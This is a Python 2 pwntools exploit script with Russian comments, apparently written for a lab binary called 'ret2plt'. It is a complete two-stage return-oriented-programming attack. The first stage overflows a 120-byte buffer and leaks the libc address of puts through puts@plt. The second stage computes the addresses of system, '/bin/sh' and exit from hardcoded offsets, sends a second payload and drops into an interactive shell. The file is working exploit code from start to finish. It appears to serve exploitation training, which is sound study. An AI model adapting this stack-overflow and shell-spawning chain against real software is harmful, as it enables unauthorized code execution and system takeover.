#!/usr/bin/env python2
# -*- coding: utf-8 -*-

# Использование: python pwn-ret2plt.py [DEBUG]

from pwn import *
import time

context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64
context.terminal  = ['tmux', 'new-window']

junk = 'A' * 120
pop_rdi_gadget = p64(0x401136)
nop_gadget = p64(0x4010af)
puts_plt = p64(0x401030)
puts_got = p64(0x404018)
main_offset = p64(0x40115a)

payload = junk + pop_rdi_gadget + puts_got + puts_plt + main_offset

p = process('./ret2plt')

"""
gdb.attach(p, '''
init-peda
start''')

# Нужен raw_input(), когда юзаешь gdb.debug() вместо gdb.attach()
"""

p.recvuntil('Case 3: Return-to-PLT')
raw_input('[?] (1-я фаза) Отправляю пейлоад?')
p.clean()
p.sendline(payload)
received = p.recvuntil('Case 3: Return-to-PLT')[:6].strip()
leaked_puts = u64(received.ljust(8, '\x00'))
log.success('(1-я фаза) Слитый адрес puts@GLIBC (./ret2plt): %s' % hex(leaked_puts))

puts_offset = 0x83cc0
libc_start = leaked_puts - puts_offset
log.success('(1-я фаза) Вычислен адрес __libc_start_main (libc): %s' % hex(libc_start))

system_offset = 0x52fd0
bin_sh_offset = 0x1afb84
exit_offset = 0x473c0

system_addr = libc_start + system_offset
log.success('(2-я фаза) Вычислен адрес system (libc): %s' % hex(system_addr))

bin_sh_addr = libc_start + bin_sh_offset
log.success('(2-я фаза) Вычислен адрес "/bin/sh" (libc): %s' % hex(bin_sh_addr))

exit_addr = libc_start + exit_offset
log.success('(2-я фаза) Вычислен адрес exit (libc): %s' % hex(exit_addr))

system_addr = p64(system_addr)
bin_sh_addr = p64(bin_sh_addr)
exit_addr = p64(exit_addr)

payload2 = junk + pop_rdi_gadget + bin_sh_addr + nop_gadget + system_addr + exit_addr

#p.recvuntil('Case 3: Return-to-PLT')
raw_input('[?] (2-я фаза) Отправляю пейлоад?')
p.clean()
p.sendline(payload2)

p.clean()
p.interactive()
